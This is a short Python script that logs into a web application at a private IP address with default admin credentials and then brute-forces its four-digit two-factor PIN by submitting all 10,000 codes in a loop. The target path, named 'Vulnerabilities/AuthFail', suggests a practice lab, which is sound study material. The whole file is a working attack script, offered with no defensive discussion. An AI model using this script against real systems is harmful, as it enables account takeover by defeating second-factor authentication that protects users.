import requests

BASE = "http://172.30.6.213/Vulnerabilities/AuthFail"

s = requests.Session()

# Login
r = s.post(
    f"{BASE}/index.php",
    data={
        "username": "admin",
        "password": "admin123"
    },
    allow_redirects=True
)

print("[+] Session:", s.cookies.get_dict())

# Brute force PIN
for pin in range(10000):
    code = f"{pin:04d}"

    r = s.post(
        f"{BASE}/2fa.php",
        data={"pin": code}
    )

    text = r.text.lower()

    # Sesuaikan dengan respons aplikasi
    if "invalid" not in text and "incorrect" not in text:
        print(f"[+] PIN FOUND: {code}")
        print(r.text)
        break
